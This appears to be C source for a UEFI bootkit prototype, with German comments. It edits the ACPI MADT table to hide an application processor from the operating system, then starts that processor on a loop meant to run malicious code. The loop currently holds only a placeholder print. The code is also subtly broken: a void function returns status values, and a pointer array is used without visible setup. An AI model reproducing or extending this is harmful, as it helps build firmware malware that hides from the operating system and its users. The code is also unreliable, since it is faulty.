
#include "bootkit.h"
#include "proc.h"

/*
 * So hier beginnt der eigentliche Spass. Die Funktion muss so einiges unternehmen. Also die 
 * efi_main() funktion wird diese Sektion in¨UEFI Speicher kopieren. Dann wird sie diese 
 * Funktion aufrufen. Die Funktion muss folgendes tun:
 *
 *   1. Gewisse Anzahl nicht-Boostrap (application processor - AP) Prozessoren deaktivieren
 *   1. Diese Prozessoren initialisieren (alle interrupts deaktivieren - soweit möglich)
 *   2. Einen der AP auf den event loop umleiten, welcher den Schadcode ausführt
 *   3. Andere APs in einen Dauerhaften Schlafzustand versetzen
 *   4. returnen
*/


void BOOTKIT_FUNC bootkit_entry() {

    EFI_STATUS Status;
    EFI_MP_SERVICES_PROTOCOL *MpServices;
    UINTN NumberOfProcessors, NumberOfEnabledProcessors;
    UINTN ProcessorId;

    // Locate the MP Services Protocol
    Status = ST->BootServices->LocateProtocol(
        &gEfiMpServiceProtocolGuid,
        NULL,
        (VOID **)&MpServices
    );
    if (EFI_ERROR(Status)) {
        DEBUG_PRINT(L"Failed to locate MP Services Protocol: %r\n", Status);
        return Status;
    }

    // Get the number of processors and enabled processors
    Status = MpServices->GetNumberOfProcessors(
        MpServices,
        &NumberOfProcessors,
        &NumberOfEnabledProcessors
    );
    if (EFI_ERROR(Status)) {
        DEBUG_PRINT(L"Failed to get processor count: %r\n", Status);
        return Status;
    }

    DEBUG_PRINT(L"Number of processors: %u\n", NumberOfProcessors);
    DEBUG_PRINT(L"Number of enabled processors: %u\n", NumberOfEnabledProcessors);

    // deaktivere ein paar prozessoren
	MADT_TYPE *Madt = NULL;
	APIC_TYPE *apicList[1];		// nur einen einzelnen deaktiveren für den Anfang

	Status = get_madt(&Madt);
	if (EFI_ERROR(Status)) {
		DEBUG_PRINT(L"Konnte Memory MADT nicht laden, Fehler: %r", Status);
		return Status;
	}

	manipulate_madt(Madt, 2, apicList);

    for (ProcessorId = 0; ProcessorId < NumberOfProcessors; ProcessorId++) {

    	// Wähle einen AP aus, der auch deaktiviert wurde
    	for (int i = 0; i < sizeof(apicList) / sizeof(apicList[0]); i++) {
    		if (ProcessorId == apicList[i]->ApicId) {

    			PROCESSOR_ARGUMENTS *args = AllocatePool(sizeof(PROCESSOR_ARGUMENTS));
    			args->ProcessorId = ProcessorId;
    			args->SystemTable = ST;

		        //Status = uefi_call_wrapper(MpServices->StartupThisAP, 7
		        Status = MpServices->StartupThisAP(
		            MpServices,
		            application_processor_entry,    // Function to execute
		            ProcessorId,               		// Processor ID
		            NULL,                      		// Wait Event (NULL for no wait)
		            0,                         		// Timeout in microseconds
		            (VOID *)args,       			// Pointer to buffer passed to the function
		            NULL                       		// Pointer to a boolean indicating processor status
		        );
		        if (EFI_ERROR(Status)) {
		            DEBUG_PRINT(L"Failed to start processor %u: %r\n", ProcessorId, Status);
		        } else {
		            DEBUG_PRINT(L"Processor %u started successfully.\n", ProcessorId);
		        }
		        break;
    		}
    	}
    }

    return EFI_SUCCESS;

}

// Alle APs werden zunächst auf diese Funktion umgeleitet
void BOOTKIT_FUNC INTERNAL application_processor_entry(PROCESSOR_ARGUMENTS *args) {

    while (1) {
        uefi_call_wrapper(args->SystemTable->ConOut->OutputString, 2, 
        	args->SystemTable->ConOut, L"This message appears every 3 seconds\n");
        uefi_call_wrapper(args->SystemTable->BootServices->Stall, 1, 
        	3000000);
    }
}

